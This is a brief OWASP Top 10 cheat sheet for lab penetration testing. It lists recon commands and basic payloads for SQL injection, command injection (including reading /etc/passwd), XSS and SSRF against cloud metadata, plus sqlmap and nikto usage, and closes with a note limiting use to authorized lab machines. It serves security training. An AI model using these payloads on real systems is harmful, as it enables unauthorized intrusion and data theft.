# CHEATSHEET — OWASP Top 10 (2021)

## Quick Recon
- Ping: `ping -c 3 <IP>`
- Nmap common scan: `nmap -sC -sV -oN nmap_initial.txt <IP>`
- Enumerate web directories: `ffuf -u http://<IP>/FUZZ -w /path/wordlist.txt -mc 200,301,302`
- Gobuster: `gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

---

## HTTP Interactions
- Curl basic: `curl -i http://<IP>/path`
- Follow redirects & show headers: `curl -v -L http://<IP>/`

---

## Common payload templates

### IDOR / Broken Access Control
- Try sequential IDs: `GET /user/1`, `/user/2` ...
- Tamper object id in request body or URL via Burp.

### SQL Injection (basic)
- Test: `' OR '1'='1` or `admin' -- `
- Extract: `UNION SELECT NULL, version(), database(), user()`

### Command Injection
- Test: `; ls -la` or `&& whoami` or `| cat /etc/passwd`
- Use URL encoding if needed.

### XSS (simple)
- Reflected test: `<script>alert('XSS')</script>`
- HTML context variants: `"><svg/onload=alert(1)>`

### SSRF
- Test: `http://127.0.0.1:80/` or `http://169.254.169.254/latest/meta-data/` (in cloud labs only where safe/authorized)
- Redirect discovery: use `burp` to tamper URLs.

---

## Tools quick commands
- Burp: intercept and modify requests.
- sqlmap quick: `sqlmap -u "http://<IP>/vuln.php?id=1" --batch --dbs`
- nikto: `nikto -h http://<IP>/`
- searchsploit: `searchsploit <service> <version>`

---

## Hashes & Crypto
- Check hashes: `hashid file` or `hash-identifier`
- openssl decrypt example: `openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -pass pass:password`

---

## Notes on responsible use
- Use above tools **only** on authorized lab machines (like TryHackMe VMs).
- When running automated tools, keep them targeted and avoid collateral scanning.

